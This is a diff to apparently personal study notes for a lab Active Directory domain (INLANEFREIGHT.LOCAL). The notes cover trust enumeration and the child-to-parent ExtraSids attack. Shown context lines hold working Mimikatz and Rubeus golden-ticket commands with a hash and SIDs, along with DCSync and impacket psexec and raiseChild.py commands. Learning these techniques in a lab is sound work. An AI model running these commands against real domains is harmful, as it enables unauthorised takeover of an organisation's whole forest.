@@ -416,6 +416,7 @@ Trust: Used to establish forest-forest or domain-domain authentication; lets use
 ## **Trust Enumeration**
 
 ```
+Import-Module .\PowerView.ps1
 Get-DomainTrustMapping
 ```
 
@@ -439,9 +440,11 @@ extraSIDS attack: lets user add an admin account to the SID history attribute of
 >FDQN of child domain (X.INLANEFREIGHT.LOCAL) 
 >
 >SID of Enterprise Admins group of root domain
-### From Windows 
 
-### **Mimikatz** 
+### Child To Parent
+#### From Windows 
+
+#### **Mimikatz** 
 
 1.**KRBTGT hash**
 
@@ -476,7 +479,7 @@ Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | sele
 ./mimikatz.exe 
 kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:CHILD-DOMAIN-SID /krbtgt:/KRBTGT-hash /sids:ENTERPRISE-ADMIN-SID /ptt
 ```
-### Rubeus 
+#### Rubeus 
 
 ```
 .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
@@ -487,7 +490,7 @@ kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:CHILD-D
 ```
 lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
 ```
-### From Linux 
+#### From Linux 
 >[!NOTE]
 > KRBTGT hash for child domain
 >
@@ -525,3 +528,11 @@ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.loc
 ```
 raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
 ```
+### Cross Forest 
+#### Windows 
+**Situation One**
+1. Find domain user who is domain admin
+2. Run rubeus, specifying domain and user
+**Admin Password Reuse**
+- Foreign group membership can be found 
+#### Linux 
